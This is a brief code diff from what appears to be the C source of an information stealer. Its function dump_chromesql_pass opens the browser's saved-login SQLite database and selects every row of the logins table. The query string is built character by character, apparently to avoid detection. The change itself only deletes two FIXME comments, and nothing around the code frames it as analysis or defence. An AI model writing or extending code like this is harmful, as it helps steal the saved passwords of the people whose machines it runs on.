@@ -149,9 +149,9 @@ VOID dump_chromesql_pass()
 	sqlite3 *lpDb = NULL;
 	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
 	{
-		sqlite3_busy_timeout(lpDb, 5000); // FIXME
+		sqlite3_busy_timeout(lpDb, 5000); 
 		CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'l', 'o', 'g', 'i', 'n', 's', ';', 0x0 };
-		sqlite3_exec(lpDb, strQuery, chrome_worker, 0, NULL); // FIXME: char array
+		sqlite3_exec(lpDb, strQuery, chrome_worker, 0, NULL); 
 
 		sqlite3_close(lpDb);
 	}
